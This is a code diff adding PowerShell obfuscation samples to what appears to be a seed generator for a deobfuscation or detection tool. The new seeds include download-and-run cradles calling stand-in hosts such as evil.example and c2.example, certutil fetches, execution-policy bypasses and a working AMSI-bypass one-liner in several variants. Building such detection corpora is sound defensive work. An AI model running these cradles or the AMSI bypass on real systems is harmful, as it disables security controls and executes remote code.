@@ -22,6 +22,21 @@ const POWERSHELL_TECHNIQUE_CATALOG = Object.freeze([
   'PowerShell Format Operator (-f)',
   'PowerShell String Reversal',
   'PowerShell Variable Resolution',
+  // ── Phase 1 additions (AGENTS.md recurring pain-points) ────────────
+  // -EncodedCommand / -enc / -ec UTF-16LE base64 (T1059.001 canonical
+  // stager) + [char]N char-array reassembly (Empire/Nishang/PowerSploit)
+  // + [Convert]::FromBase64String + Encoding.GetString full form +
+  // -bxor inline-key decode (BloodHound/SharpHound/CS beacon shape) +
+  // [scriptblock]::Create(...).Invoke() AMSI-bypass iex replacement +
+  // AmsiUtils.amsiInitFailed pattern (T1562.001).
+  'PowerShell -EncodedCommand (UTF-16LE base64)',
+  'PowerShell [char]N+[char]N Reassembly',
+  "PowerShell [Convert]::FromBase64String + UTF8.GetString",
+  "PowerShell [Convert]::FromBase64String + UNICODE.GetString",
+  "PowerShell [Convert]::FromBase64String + ASCII.GetString",
+  'PowerShell -bxor Inline-Key Decode',
+  'PowerShell [scriptblock]::Create',
+  'PowerShell AMSI Bypass',
 ]);
 
 function makeRng(seed) {
@@ -179,6 +194,161 @@ function genVariableResolution() {
   return out;
 }
 
+// ── Phase 1 additions ────────────────────────────────────────────────────
+
+function _toBase64Utf16LE(text) {
+  // Mirror PowerShell's `[Convert]::ToBase64String(
+  //   [Text.Encoding]::Unicode.GetBytes(<string>))` pipeline — i.e.
+  // UTF-16LE byte encoding then base64 over the bytes.
+  const bytes = Buffer.alloc(text.length * 2);
+  for (let i = 0; i < text.length; i++) {
+    const cc = text.charCodeAt(i);
+    bytes[i * 2]     = cc & 0xff;
+    bytes[i * 2 + 1] = (cc >> 8) & 0xff;
+  }
+  return bytes.toString('base64');
+}
+
+function _toBase64Utf8(text) {
+  return Buffer.from(text, 'utf8').toString('base64');
+}
+
+function genEncodedCommand() {
+  // `powershell.exe -EncodedCommand <b64-utf16le>` — the canonical
+  // PowerShell stager. Three arg spellings (-EncodedCommand / -enc /
+  // -ec), plus an inline vs newline-terminated form.
+  const out = [];
+  const payloads = [
+    'Invoke-Expression (New-Object Net.WebClient).DownloadString("http://evil.example/p.ps1")',
+    "IEX (iwr -UseBasicParsing 'http://c2.example/s'); whoami",
+    'Start-Process powershell -Arg "-Command","Set-ExecutionPolicy Bypass; iex $_"',
+  ];
+  for (const pl of payloads) {
+    const b64 = _toBase64Utf16LE(pl);
+    out.push(makeSeed(`powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${b64}`, 'Invoke'));
+    out.push(makeSeed(`pwsh -NoP -Enc ${b64}\n`, 'Invoke'));
+    out.push(makeSeed(`powershell -ec ${b64}`, 'Invoke'));
+  }
+  return out;
+}
+
+function genCharArrayReassembly() {
+  // `[char]0x49 + [char]0x45 + [char]0x58` → "IEX". Decimal and hex
+  // forms plus the `[System.Char]` variant.
+  const out = [];
+  const kws = ['IEX', 'iex', 'Invoke-Expression', 'powershell', 'certutil', 'rundll32'];
+  for (const kw of kws) {
+    const hex = kw.split('').map(c => `[char]0x${c.charCodeAt(0).toString(16)}`).join('+');
+    out.push(makeSeed(`(${hex})`, kw));
+    const dec = kw.split('').map(c => `[char]${c.charCodeAt(0)}`).join(' + ');
+    out.push(makeSeed(`& (${dec})`, kw));
+    const sys = kw.split('').map(c => `[System.Char]${c.charCodeAt(0)}`).join('+');
+    out.push(makeSeed(`$x = ${sys}; & $x`, kw));
+  }
+  return out;
+}
+
+function genConvertFromBase64String() {
+  // `[Convert]::FromBase64String(<b64>)` wrapped in
+  // `[Encoding]::UTF8.GetString` / `::Unicode.GetString` /
+  // `::ASCII.GetString`.
+  const out = [];
+  const payloads = [
+    { text: 'Invoke-Expression $cmd; whoami /all',         kw: 'Invoke-Expression' },
+    { text: 'IEX(New-Object Net.WebClient).DownloadString("http://e/b")', kw: 'DownloadString' },
+    { text: 'certutil -urlcache -f http://e/p p.exe',      kw: 'certutil' },
+  ];
+  for (const p of payloads) {
+    out.push(makeSeed(
+      `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${_toBase64Utf8(p.text)}'))`,
+      p.kw,
+    ));
+    out.push(makeSeed(
+      `[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("${_toBase64Utf16LE(p.text)}"))`,
+      p.kw,
+    ));
+    out.push(makeSeed(
+      `[Encoding]::ASCII.GetString([Convert]::FromBase64String('${_toBase64Utf8(p.text)}'))`,
+      p.kw,
+    ));
+  }
+  return out;
+}
+
+function genBxorInlineKey() {
+  // `@(N,N,...) | % { $_ -bxor 0xKEY }` — common shellcode / string
+  // decoder. We synthesise both printable-decoded and shellcode-tell
+  // variants.
+  const out = [];
+  const payloads = [
+    'Invoke-Expression iex',
+    'powershell.exe -Command whoami',
+    'certutil -decode in out',
+  ];
+  const keys = [0x5a, 0x42, 0xaa, 0x01];
+  for (const pl of payloads) {
+    for (const key of keys) {
+      const enc = [...pl].map(c => (c.charCodeAt(0) ^ key).toString());
+      if (enc.length < 8) continue;
+      const arrSrc = enc.join(',');
+      out.push(makeSeed(
+        `$b = @(${arrSrc}); $b | ForEach-Object { [char]($_ -bxor ${key}) }`,
+        pl.slice(0, 8),
+      ));
+      // Hex-form key
+      out.push(makeSeed(
+        `@(${arrSrc}) | % { $_ -bxor 0x${key.toString(16).padStart(2,'0')} }`,
+        pl.slice(0, 8),
+      ));
+    }
+  }
+  // Shellcode-tell variant: decodes to 'kernel32' + garbage
+  const shellTell = 'kernel32.VirtualAlloc loadlibrary';
+  const key2 = 0x33;
+  const enc2 = [...shellTell].map(c => (c.charCodeAt(0) ^ key2).toString());
+  out.push(makeSeed(
+    `@(${enc2.join(',')}) | ForEach-Object { $_ -bxor ${key2} }`,
+    'kernel32',
+  ));
+  return out;
+}
+
+function genScriptBlockCreate() {
+  // `[scriptblock]::Create('<cmd>').Invoke()` — canonical iex replacement.
+  const out = [];
+  const payloads = [
+    'Invoke-Expression (iwr http://e/p).Content',
+    'IEX (New-Object Net.WebClient).DownloadString("http://c2/s")',
+    'powershell.exe -NoP -Command whoami',
+  ];
+  for (const pl of payloads) {
+    const kw = pl.split(' ')[0];
+    out.push(makeSeed(`[scriptblock]::Create('${pl}').Invoke()`, kw));
+    out.push(makeSeed(`([ScriptBlock]::Create("${pl}")).Invoke()`, kw));
+    out.push(makeSeed(`[System.Management.Automation.ScriptBlock]::Create('${pl}').Invoke()`, kw));
+  }
+  return out;
+}
+
+function genAmsiBypass() {
+  // AmsiUtils.amsiInitFailed pattern — structural IOC recognition,
+  // not a real decode. Several concat variants seen in the wild.
+  const out = [];
+  out.push(makeSeed(
+    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
+    'amsiInitFailed',
+  ));
+  out.push(makeSeed(
+    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)",
+    'AmsiUtils',
+  ));
+  out.push(makeSeed(
+    "[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsi${null}InitFailed\",'NonPublic,Static').SetValue($null,$true)",
+    'AmsiUtils',
+  ));
+  return out;
+}
+
 function generatePowerShellSeeds() {
   const rng = makeRng(0x50E1100A);
   return [
@@ -188,6 +358,13 @@ function generatePowerShellSeeds() {
     ...genFormatOperator(),
     ...genStringReversal(),
     ...genVariableResolution(),
+    // Phase 1 additions
+    ...genEncodedCommand(),
+    ...genCharArrayReassembly(),
+    ...genConvertFromBase64String(),
+    ...genBxorInlineKey(),
+    ...genScriptBlockCreate(),
+    ...genAmsiBypass(),
   ];
 }
 
